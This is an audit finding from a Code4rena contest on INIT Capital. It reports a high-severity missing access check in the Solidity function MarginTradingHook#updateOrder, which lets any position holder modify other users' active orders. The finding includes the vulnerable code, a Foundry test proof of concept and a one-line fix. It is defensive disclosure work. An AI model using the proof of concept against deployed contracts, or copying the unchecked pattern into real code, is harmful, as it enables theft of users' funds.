---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/perpetuals
  - sector/stable
protocol: "[[INIT Capital]]"
auditors:
  - "[[sashik_eth]]"
report: "https://code4rena.com/reports/2024-01-init-capital-invitational"
genome:
  - "[[missing-modifier]]"
  - "[[permanent]]"
  - "[[access-roles]]"
---
# [H-01]  MarginTradingHook#updateOrder lacks access control

- id: 30257
- impact: HIGH
- protocol: [[INIT Capital]]
- reporter: sashik\_eth (Code4rena)
- source: https://code4rena.com/reports/2024-01-init-capital-invitational

## Summary


The `MarginTradingHook#updateOrder` function allows users to update their orders in a margin trading system. However, it fails to check that the user updating the order is the original creator of the order. This means that anyone could potentially update any active order, which could lead to losses for users. A proof of concept has been provided to show how this could be exploited. To fix this issue, the developers should add a check that verifies the caller's `initPosId` is equal to the `initPosId` saved in the order struct.

## Details


The `MarginTradingHook#updateOrder` function allows users to update their orders, it checks that the requested order is active order (L513) and that the function caller has opened position (L515). However, this function fails to check that user `initPosId` is equal to the `initPosId` saved in the order struct, meaning that the caller is an order creator:

```solidity
File: MarginTradingHook.sol
503:     function updateOrder(
504:         uint _posId,
505:         uint _orderId,
506:         uint _triggerPrice_e36,
507:         address _tokenOut,
508:         uint _limitPrice_e36,
509:         uint _collAmt
510:     ) external { 
511:         _require(_collAmt != 0, Errors.ZERO_VALUE);
512:         Order storage order = __orders[_orderId];
513:         _require(order.status == OrderStatus.Active, Errors.INVALID_INPUT);
514:         uint initPosId = initPosIds[msg.sender][_posId];
515:         _require(initPosId != 0, Errors.POSITION_NOT_FOUND);
516:         MarginPos memory marginPos = __marginPositions[initPosId];
517:         uint collAmt = IPosManager(POS_MANAGER).getCollAmt(initPosId, marginPos.collPool);
518:         _require(_collAmt <= collAmt, Errors.INPUT_TOO_HIGH);
519: 
520:         order.triggerPrice_e36 = _triggerPrice_e36;
521:         order.limitPrice_e36 = _limitPrice_e36;
522:         order.collAmt = _collAmt;
523:         order.tokenOut = _tokenOut;
524:         emit UpdateOrder(initPosId, _orderId, _tokenOut, _triggerPrice_e36, _limitPrice_e36, _collAmt);
525:     }
```

### Impact

Any order in the `MarginTradingHook` contract could be updated by other users.

### Proof of Concept

The next test added to the `TestMarginTradingHelper` file could show a scenario when the user can update some other active orders:

```solidity
    function testUpdateNotOwnerOrder() public {
        _setUpDexLiquidity(QUOTE_TOKEN, BASE_TOKEN);
        address tokenIn = USDT;
        address collToken = WETH;
        address borrToken = USDT;
        {
            (uint posIdAlice, uint initPosIdAlice) = _openPos(tokenIn, collToken, borrToken, ALICE, 10_000, 10_000);

            (uint posIdBob, ) = _openPos(tokenIn, collToken, borrToken, BOB, 10_000, 10_000);

            uint markPrice_e36 = lens.getMarkPrice_e36(collToken, borrToken);
            uint triggerPrice_e36 = markPrice_e36 * 9 / 10; // 90% from mark price
            uint limitPrice_e36 = markPrice_e36 * 89 / 100; // 89% from mark price
            address tokenOut = WETH;
            MarginPos memory marginPos = hook.getMarginPos(initPosIdAlice);
            uint orderIdAlice = _addStopLossOrder(
                ALICE,
                posIdAlice,
                triggerPrice_e36,
                tokenOut,
                limitPrice_e36,
                positionManager.getCollAmt(initPosIdAlice, marginPos.collPool)
            );
            vm.startPrank(BOB, BOB);
            hook.updateOrder(posIdBob, orderIdAlice, triggerPrice_e36 - 1, tokenOut, limitPrice_e36, 1000);
            vm.stopPrank();
            Order memory order = hook.getOrder(orderIdAlice);
            require(order.triggerPrice_e36 == triggerPrice_e36 - 1, 'order not updated');
        }
    }
```

### Recommended Mitigation Steps

Consider adding a check that prevents the possibility of updating arbitrary orders, similar to the `cancelOrder` function:

```solidity
     _require(order.initPosId == initPosId, Errors.INVALID_INPUT);
```

**[fez-init (INIT) confirmed](https://github.com/code-423n4/2024-01-init-capital-invitational-findings/issues/34#issuecomment-1929239967)**

***
